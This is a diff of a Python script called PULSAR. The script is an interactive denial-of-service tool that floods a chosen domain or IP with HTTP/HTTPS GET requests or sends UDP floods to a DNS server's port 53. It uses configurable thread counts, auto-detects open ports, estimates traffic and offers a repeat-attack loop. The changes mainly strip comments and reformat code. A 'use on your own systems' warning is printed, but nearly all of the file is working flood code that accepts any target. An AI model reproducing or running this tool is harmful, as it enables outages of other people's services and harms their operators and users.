@@ -12,7 +12,6 @@ import random
 import os
 import re 
 
-# --- Set Console Title ---
 def set_console_title(title_text):
     if sys.platform == "win32":
         os.system(f"title {title_text}")
@@ -23,7 +22,7 @@ def set_console_title(title_text):
 PROGRAM_NAME = "PULSAR"
 STOP_KEY_INFO = "ESC TO STOP" 
 DNS_PORT = 53
-# DEFAULT_ATTACK_TYPE usunięte, wybór będzie jawny
+DEFAULT_ATTACK_TYPE = "HTTPS"
 
 try:
     import keyboard 
@@ -32,19 +31,16 @@ except ImportError:
     KEYBOARD_AVAILABLE = False
     keyboard = None 
 
-# --- Global Variables ---
 stop_event = threading.Event()
 packets_sent = 0
 bytes_sent = 0
 user_interrupted_attack = False
 
-# --- Appearance Configuration (ANSI Colors) ---
 class Colors:
     HEADER = '\033[95m'; OKBLUE = '\033[94m'; OKCYAN = '\033[96m'
     OKGREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
     ENDC = '\033[0m'; BOLD = '\033[1m'; UNDERLINE = '\033[4m'
 
-# --- UI Elements ---
 LINE_SEP_CHAR = "═"
 BOX_HLINE_CHAR = "─"
 BOX_VLINE_CHAR = "│"
@@ -71,54 +67,64 @@ BANNER = f"""
 DEFAULT_THREADS_LOW_RESOURCE = 5 
 DEFAULT_THREADS_NORMAL = 100
 
-# --- Helper Functions (bez zmian) ---
 def strip_ansi_codes(text):
     return re.sub(r'\x1b\[([0-9,A-Z]{1,2}(;[0-9]{1,2})?(;[0-9]{1,2})?)?[m|K|H|f|J]', '', text)
+
 def visible_len(text_with_ansi):
     return len(strip_ansi_codes(text_with_ansi))
+
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
     current_stop_key_info = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
     set_console_title(f"{PROGRAM_NAME} - {current_stop_key_info}")
+
 def print_ui_header(text, color=Colors.OKCYAN):
     print(f"\n{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
     text_content = f"{color}{Colors.BOLD}{text}{Colors.ENDC}"
     content_visible_len = visible_len(text_content)
     innerWidth = UI_WIDTH - 2 
     padding_total = innerWidth - content_visible_len
-    padding_left = padding_total // 2; padding_right = padding_total - padding_left
+    padding_left = padding_total // 2
+    padding_right = padding_total - padding_left
     padding_left = max(0, padding_left); padding_right = max(0, padding_right)
     print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}{' ' * padding_left}{text_content}{' ' * padding_right}{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
     print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
+
 def print_boxed_line(content):
     available_width_for_content = UI_WIDTH - 4
     content_visible_len = visible_len(content)
     padding_right = available_width_for_content - content_visible_len
     padding_right = max(0, padding_right)
     print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {content}{' ' * padding_right} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
+
 def print_boxed_key_value(key_text, value_text, key_color=Colors.OKBLUE, value_color=Colors.BOLD):
     label_width = 23 
     key_formatted = f"{key_color}{key_text:<{label_width}}{Colors.ENDC}"
     value_formatted = f"{value_color}{value_text}{Colors.ENDC}"
     line_content = f"{key_formatted} {value_formatted}"
     print_boxed_line(line_content)
+
 def print_warning(text): print(f"{Colors.WARNING}│ [!] WARNING:{Colors.ENDC} {text}")
 def print_info(text): print(f"{Colors.OKCYAN}│ [*] INFO:{Colors.ENDC} {text}")
 def print_success(text): print(f"{Colors.OKGREEN}│ [+] SUCCESS:{Colors.ENDC} {text}")
 def print_error(text): print(f"{Colors.FAIL}│ [X] ERROR:{Colors.ENDC} {text}")
-def get_random_user_agent(): return random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", f"{PROGRAM_NAME} Agent/1.4"])
+
+def get_random_user_agent():
+    return random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", f"{PROGRAM_NAME} Agent/1.4"])
+
 def format_size(num_bytes):
     for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
         if abs(num_bytes) < 1024.0: return f"{num_bytes:.2f} {unit}"
         num_bytes /= 1024.0
     return f"{num_bytes:.2f} PB"
+
 def is_valid_ip(address):
     try: socket.inet_aton(address); return True
     except socket.error: return False
 
-# --- HTTP Attack Worker (bez zmian) ---
 def attack_http_worker(target_ip, target_port, target_host_header, use_ssl):
-    global packets_sent, bytes_sent; path = f"/?{random.randint(1000, 99999)}"
+    global packets_sent, bytes_sent
+    path = f"/?{random.randint(1000, 99999)}"
     request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_header}\r\nUser-Agent: {get_random_user_agent()}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
     request_bytes = request_str.encode('utf-8'); request_size = len(request_bytes)
     while not stop_event.is_set():
@@ -135,9 +141,9 @@ def attack_http_worker(target_ip, target_port, target_host_header, use_ssl):
                 try: conn.shutdown(socket.SHUT_RDWR); conn.close()
                 except: pass
 
-# --- DNS Attack Worker (bez zmian) ---
 def attack_dns_worker(target_ip_dns):
-    global packets_sent, bytes_sent; payload = os.urandom(random.randint(32, 128)); payload_size = len(payload)
+    global packets_sent, bytes_sent
+    payload = os.urandom(random.randint(32, 128)); payload_size = len(payload)
     while not stop_event.is_set():
         try:
             sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -145,13 +151,12 @@ def attack_dns_worker(target_ip_dns):
             packets_sent += 1; bytes_sent += payload_size; sock_udp.close()
         except: pass
 
-# --- Traffic Estimation Function (bez zmian) ---
 def estimate_traffic(attack_type, target_input_for_est, port, num_threads, duration):
-    # ... (kod tej funkcji bez zmian) ...
     print_ui_header("TRAFFIC ESTIMATION", Colors.OKCYAN)
     if attack_type == "DNS":
         print_info(f"Estimating for DNS (UDP Flood) on {target_input_for_est}:{DNS_PORT}...")
-        avg_payload_size = (32 + 128) // 2; assumed_pps_per_worker = 500 
+        avg_payload_size = (32 + 128) // 2
+        assumed_pps_per_worker = 500 
         estimated_total_packets = num_threads * assumed_pps_per_worker * duration
         estimated_total_data_bytes = estimated_total_packets * avg_payload_size
         print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
@@ -160,6 +165,7 @@ def estimate_traffic(attack_type, target_input_for_est, port, num_threads, durat
         print_boxed_key_value("Est. Outgoing Traffic", format_size(estimated_total_data_bytes), value_color=f"{Colors.OKGREEN}{Colors.BOLD}")
         print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
         print_warning("This is a VERY ROUGH estimate for UDP flood."); return estimated_total_data_bytes, estimated_total_packets
+
     target_ip_for_est = None; target_host_for_header_est = target_input_for_est 
     if is_valid_ip(target_input_for_est): target_ip_for_est = target_input_for_est
     else:
@@ -197,12 +203,10 @@ def estimate_traffic(attack_type, target_input_for_est, port, num_threads, durat
     print_warning("This is a VERY ROUGH estimate for HTTP."); print_warning("Does not include protocol overhead or server responses.")
     return estimated_total_data_bytes, estimated_total_requests
 
-# --- Interactive Input Function ---
 def get_interactive_input():
     clear_console(); print(BANNER)
     print_ui_header(f"{PROGRAM_NAME} INTERACTIVE SETUP")
     current_default_threads = DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL
-    
     def get_styled_input(prompt_main, prompt_example="", default_value_text=""):
         full_prompt = f" {Colors.OKCYAN}❯ {prompt_main}:{Colors.ENDC} "
         if prompt_example: full_prompt += f"{Colors.OKBLUE}({prompt_example}){Colors.ENDC} "
@@ -212,15 +216,12 @@ def get_interactive_input():
 
     attack_type_val = None
     while attack_type_val is None:
-        raw_attack_type = get_styled_input("Choose attack type", "HTTPS or DNS").upper() # Zmieniono z HTTP
-        if raw_attack_type == "HTTPS": # Zmieniono z HTTP
-            attack_type_val = "HTTPS"; print_success(f"Attack type: {Colors.BOLD}HTTPS/HTTP (Web){Colors.ENDC}\n"); break
-        elif raw_attack_type == "DNS": 
-            attack_type_val = "DNS"; print_success(f"Attack type: {Colors.BOLD}DNS (UDP Flood){Colors.ENDC}\n"); break
-        else: 
-            print_warning("Invalid type. Please choose HTTPS or DNS.")
+        raw_attack_type = get_styled_input("Choose attack type", "HTTPS or DNS").upper()
+        if raw_attack_type == "HTTPS": attack_type_val = "HTTPS"; print_success(f"Attack type: {Colors.BOLD}HTTPS/HTTP (Web){Colors.ENDC}\n"); break
+        elif raw_attack_type == "DNS": attack_type_val = "DNS"; print_success(f"Attack type: {Colors.BOLD}DNS (UDP Flood){Colors.ENDC}\n"); break
+        else: print_warning("Invalid type. Choose HTTPS or DNS.")
 
-    prompt_target = "Enter target domain/IP (for HTTPS/HTTP)" if attack_type_val == "HTTPS" else "Enter target DNS Server IP"
+    prompt_target = "Enter target domain/IP (for HTTPS)" if attack_type_val == "HTTPS" else "Enter target DNS Server IP"
     example_target = "e.g., example.com" if attack_type_val == "HTTPS" else "e.g., 192.168.1.1"
     target_input_val = "" 
     while not target_input_val:
@@ -250,9 +251,7 @@ def get_interactive_input():
                 except (socket.timeout, ConnectionRefusedError, OSError) as e_net: print_warning(f"Port 443 test (network): {type(e_net).__name__}.")
                 except ssl.SSLError as e_ssl: print_warning(f"Port 443 test (SSL): {type(e_ssl).__name__}. Might be open but with SSL/TLS issues.")
                 except Exception as e_other: print_warning(f"Port 443 test (other): {type(e_other).__name__}.")
-                
                 if port_443_successful: break
-
                 print_info("Testing port 80 (HTTP)..."); 
                 try:
                     s_test_http=socket.create_connection((target_input_val,80), timeout=2); s_test_http.close()
@@ -260,7 +259,6 @@ def get_interactive_input():
                 except Exception as e_http80: 
                     print_error(f"Port 80 test failed: {type(e_http80).__name__}.")
                     print_error(f"Could not auto-detect an open port. Please specify manually."); continue 
-                
                 if target_port_val is None: print_error("Auto-detection failed for both ports."); continue
             else:
                 try:
@@ -268,69 +266,46 @@ def get_interactive_input():
                     if port_val_int not in [80, 443]: print_warning("Invalid port (only 80 or 443 for HTTPS/HTTP)."); continue
                     target_port_val = port_val_int
                     print_success(f"Port set to: {Colors.BOLD}{target_port_val}{Colors.ENDC}\n")
-                    # break # Nie jest potrzebne, bo pętla while zakończy się naturalnie
                 except ValueError: print_warning("Not a valid port number.")
-    else: # Dla ataku DNS
+    else: 
         target_port_val = DNS_PORT 
         print_info(f"DNS attack will target port {Colors.BOLD}{DNS_PORT} (UDP){Colors.ENDC}\n")
     
     duration_val = None
     while duration_val is None:
         raw_duration = get_styled_input("Enter duration (seconds)", f"default: 60")
-        if not raw_duration: 
-            duration_val = 60; print_success(f"Duration set to default: {Colors.BOLD}60s{Colors.ENDC}\n"); break
+        if not raw_duration: duration_val = 60; print_success(f"Duration set to default: {Colors.BOLD}60s{Colors.ENDC}\n"); break
         try:
             duration_val_int = int(raw_duration)
-            if duration_val_int <= 0: 
-                print_warning("Duration must be > 0."); continue
-            duration_val = duration_val_int
-            print_success(f"Duration set to: {Colors.BOLD}{duration_val}s{Colors.ENDC}\n")
-            break # <-- DODAJ BREAK TUTAJ
-        except ValueError: 
-            print_warning("Not a valid number for duration.")
+            if duration_val_int <= 0: print_warning("Duration must be > 0."); continue
+            duration_val = duration_val_int; print_success(f"Duration set to: {Colors.BOLD}{duration_val}s{Colors.ENDC}\n"); break
+        except ValueError: print_warning("Not a valid number for duration.")
 
     num_threads_val = None
     while num_threads_val is None:
         raw_threads = get_styled_input("Enter number of threads/workers", f"default: {current_default_threads}")
-        if not raw_threads: 
-            num_threads_val = current_default_threads
-            print_success(f"Threads set to default: {Colors.BOLD}{current_default_threads}{Colors.ENDC}\n")
-            break
+        if not raw_threads: num_threads_val = current_default_threads; print_success(f"Threads set to default: {Colors.BOLD}{current_default_threads}{Colors.ENDC}\n"); break
         try:
             threads_val_int = int(raw_threads)
-            if threads_val_int <= 0: 
-                print_warning("Threads must be > 0."); continue
-            
+            if threads_val_int <= 0: print_warning("Threads must be > 0."); continue
             if threads_val_int > 5000: print_warning(f"Threads ({threads_val_int}) EXTREMELY high!")
             elif threads_val_int > 2000 and KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) very high.")
             elif threads_val_int > 50 and not KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) high for no-ESC env.")
-            
-            num_threads_val = threads_val_int
-            print_success(f"Threads set to: {Colors.BOLD}{num_threads_val}{Colors.ENDC}\n")
-            break # <-- DODAJ BREAK TUTAJ
-        except ValueError: 
-            print_warning("Not a valid number for threads.")
+            num_threads_val = threads_val_int; print_success(f"Threads set to: {Colors.BOLD}{num_threads_val}{Colors.ENDC}\n"); break
+        except ValueError: print_warning("Not a valid number for threads.")
             
     return attack_type_val, target_input_val, target_port_val, duration_val, num_threads_val
 
-# --- ESC Key Press Callback ---
 def esc_listener_thread_func():
     global user_interrupted_attack, stop_event
     if KEYBOARD_AVAILABLE and keyboard:
         try:
-            keyboard.wait('esc', suppress=True) # Ta funkcja blokuje wątek do momentu wciśnięcia ESC
-            # Kod poniżej wykona się DOPIERO PO wciśnięciu ESC
-            if not stop_event.is_set(): # Sprawdź, czy atak nie został już zatrzymany inaczej
-                # Użyj print, aby zapewnić nową linię i uniknąć problemów z \r w wątku
+            keyboard.wait('esc', suppress=True) 
+            if not stop_event.is_set():
                 print(f"\r{Colors.WARNING}{Colors.BOLD}ESC key detected!{Colors.ENDC} Stopping attack...                                        ")
-                user_interrupted_attack = True
-                stop_event.set()
-        except Exception: 
-            # Ogólne łapanie wyjątków z biblioteki keyboard, np. jeśli nie ma uprawnień
-            # Można dodać logowanie błędu tutaj, jeśli jest potrzebne
-            pass
+                user_interrupted_attack = True; stop_event.set()
+        except Exception: pass
 
-# --- Attack Execution Function (bez zmian w logice, tylko w wyświetlaniu) ---
 def run_attack(attack_type, target_input_val, target_port_val, duration_val, num_threads_val):
     global packets_sent, bytes_sent, stop_event, user_interrupted_attack
     packets_sent = 0; bytes_sent = 0; stop_event.clear(); user_interrupted_attack = False
@@ -400,8 +375,12 @@ def run_attack(attack_type, target_input_val, target_port_val, duration_val, num
             if not stop_event.is_set(): stop_event.set()
         else: sys.stdout.write("\n"); print_warning(f"\n(Ctrl+C during attack. Press {Colors.BOLD}ESC{Colors.ENDC} to stop.)"); pass 
     finally:
-        set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); sys.stdout.write("\n"); sys.stdout.flush()
-        if not stop_event.is_set(): stop_event.set()
+        set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); 
+        if not (not stop_event.is_set() and not user_interrupted_attack and elapsed_time >= duration_val):
+             if not user_interrupted_attack or (KEYBOARD_AVAILABLE and listener_thread_obj and listener_thread_obj.is_alive()):
+                 sys.stdout.write("\n")
+        sys.stdout.flush()
+        if not stop_event.is_set(): stop_event.set() 
         print_info("Waiting for workers to finish..."); time.sleep(0.5)
         final_elapsed_time = time.perf_counter() - start_time
         print_ui_header("ATTACK RESULTS", Colors.OKGREEN)
@@ -415,14 +394,13 @@ def run_attack(attack_type, target_input_val, target_port_val, duration_val, num
             print_boxed_key_value("Average Speed:", f"{format_size(avg_bps)}/s ({avg_pps:.0f} pps)")
         print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
         if user_interrupted_attack: 
-            interrupt_method = "ESC"; 
+            interrupt_method = "ESC" 
             if not (KEYBOARD_AVAILABLE and listener_thread_obj and not stop_event.is_set() and user_interrupted_attack):
                  if stop_event.is_set(): interrupt_method = "Ctrl+C"
             print_warning(f"Interrupted by user {interrupt_method}.")
         print_success(f"--- {Colors.BOLD}{PROGRAM_NAME} Attack Finished{Colors.ENDC} ---\n")
     return True
 
-# --- Main Function ---
 def main():
     is_color_supported = sys.stdout.isatty()
     if sys.platform == "win32":
@@ -440,46 +418,34 @@ def main():
     print_warning("USE RESPONSIBLY AND ONLY ON YOUR OWN SYSTEMS!"); print_warning("Misuse is ILLEGAL.")
     parser = argparse.ArgumentParser(description=f"{Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC} - DoS Test Tool.", epilog="Use responsibly!", formatter_class=argparse.RawTextHelpFormatter )
     parser.add_argument("target", nargs='?', help="Target domain or IP"); 
-    parser.add_argument("port", nargs='?', type=int, help="Port (80, 443 for HTTPS)") # Zmieniono opis portu
+    parser.add_argument("port", nargs='?', type=int, help="Port (443, 80 for HTTPS)") 
     parser.add_argument("duration", nargs='?', type=int, help="Duration (s)"); 
     parser.add_argument("-t", "--threads", type=int, default=None, help="Number of threads/workers")
     parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
-    # Zmieniono choices i default dla attack_type
     parser.add_argument("--attack_type", choices=['HTTPS', 'DNS'], default=None, help="Type of attack: HTTPS or DNS") 
     args = parser.parse_args()
-
-    last_target = None; last_port = None; last_duration = None; last_threads = None
-    # Jeśli attack_type nie jest podany z CLI, last_attack_type będzie None, co wymusi pytanie w trybie interaktywnym
-    last_attack_type = args.attack_type 
+    last_target = None; last_port = None; last_duration = None; last_threads = None; last_attack_type = args.attack_type
     cli_args_processed = False; get_new_params = True
-
     while True: 
         if get_new_params:
-            # Logika CLI
             if not cli_args_processed and not args.interactive and args.target and args.duration and args.attack_type:
                 if args.attack_type == "HTTPS" and args.port is None: print_error("Port required for HTTPS CLI attack."); sys.exit(1)
                 elif args.attack_type == "DNS" and not is_valid_ip(args.target): print_error("DNS CLI target must be IP."); sys.exit(1)
-                
                 print_info("Using CLI parameters..."); 
                 attack_type, target, duration = args.attack_type, args.target, args.duration
                 port = args.port if args.attack_type == "HTTPS" else DNS_PORT
                 threads = args.threads if args.threads and args.threads > 0 else (DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL)
-                # ... (ostrzeżenia o wątkach dla CLI)
-                if threads > 5000: print_warning(f"CLI Workers ({threads}) EXTREMELY high...") # itd.
+                if threads > 5000: print_warning(f"CLI Workers ({threads}) EXTREMELY high...")
+                elif threads > 2000 and KEYBOARD_AVAILABLE: print_warning(f"CLI Workers ({threads}) very high...")
+                elif threads > 50 and not KEYBOARD_AVAILABLE: print_warning(f"CLI Workers ({threads}) high for no-ESC env.")
                 last_target, last_port, last_duration, last_threads, last_attack_type = target, port, duration, threads, attack_type
-                cli_args_processed = True # Zaznacz, że argumenty CLI zostały przetworzone
-            else: # Tryb interaktywny lub brak wystarczających argumentów CLI
-                if last_target and get_new_params : clear_console(); print(BANNER) # Wyczyść tylko jeśli to nie pierwsze przejście i chcemy nowe dane
-                
-                # Jeśli last_attack_type jest None (np. nie podano z CLI), get_interactive_input zapyta o typ
-                # Jeśli już jest ustawiony (np. z CLI), get_interactive_input powinno to uszanować lub zapytać ponownie,
-                # w zależności od tego, jak chcemy to obsłużyć. Obecnie get_interactive_input zawsze pyta.
-                attack_type_val, target_val, port_val, duration_val, threads_val = get_interactive_input()
-                last_target, last_port, last_duration, last_threads, last_attack_type = target_val, port_val, duration_val, threads_val, attack_type_val
-        
-        get_new_params = True # Resetuj na następną iterację, chyba że wybrano "Repeat"
+                cli_args_processed = True
+            else:
+                if last_target and get_new_params : clear_console(); print(BANNER) 
+                attack_type, target, port, duration, threads = get_interactive_input()
+                last_target, last_port, last_duration, last_threads, last_attack_type = target, port, duration, threads, attack_type
+        get_new_params = True 
         attack_result = run_attack(last_attack_type, last_target, last_port, last_duration, last_threads)
-        
         if attack_result == "cancelled": pass
         while True:
             print_ui_header("WHAT NEXT?", Colors.OKGREEN)
@@ -495,7 +461,7 @@ def main():
             try:
                 choice = input(f" {Colors.OKGREEN}❯ Your choice (1-3): {Colors.ENDC}").strip()
                 if choice == '1': clear_console(); print(BANNER); get_new_params = False; break 
-                elif choice == '2': get_new_params = True; last_attack_type = None; break # Zresetuj typ, aby zapytać
+                elif choice == '2': get_new_params = True; break 
                 elif choice == '3': print_info(f"Thank you for using {Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC}. Closing..."); sys.exit(0)
                 else: print_warning("Invalid choice.")
             except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
@@ -509,11 +475,6 @@ if __name__ == "__main__":
             try: keyboard.unhook_all() 
             except: pass
         current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Console"
-        # Przywróć domyślny tytuł
-        if sys.platform == "win32": 
-            default_title = os.environ.get('COMSPEC', 'cmd.exe') # Spróbuj uzyskać ścieżkę do cmd
-            # Czasami sam `title` bez argumentu resetuje do ścieżki, ale to zależy od terminala
-            # `title cmd` lub `title PowerShell` może być bardziej przewidywalne, jeśli chcemy konkretny tytuł
-            os.system(f"title {default_title.split(os.sep)[-1]}") # Użyj tylko nazwy pliku wykonywalnego
-        else: sys.stdout.write(f"\x1b]2;\x07"); sys.stdout.flush() # Resetuj tytuł dla terminali xterm
+        if sys.platform == "win32": os.system(f"title {current_stop_key}") 
+        else: sys.stdout.write(f"\x1b]2;{current_stop_key}\x07"); sys.stdout.flush()
         print(Colors.ENDC)
